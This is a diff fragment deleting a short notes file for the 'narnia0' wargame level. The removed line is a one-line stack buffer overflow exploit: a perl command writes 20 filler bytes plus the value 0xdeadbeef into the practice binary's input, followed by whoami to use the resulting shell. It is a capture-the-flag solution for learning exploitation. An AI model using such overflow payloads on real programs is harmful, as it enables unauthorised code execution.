@@ -1,8 +1,0 @@
-1- narnia0
-2- (perl -e 'print "\x41"x20 . "\xef\xbe\xad\xde"';whoami) | ./narnia0    
-3- 
-4- 
-5- 
-6- 
-7- 
-
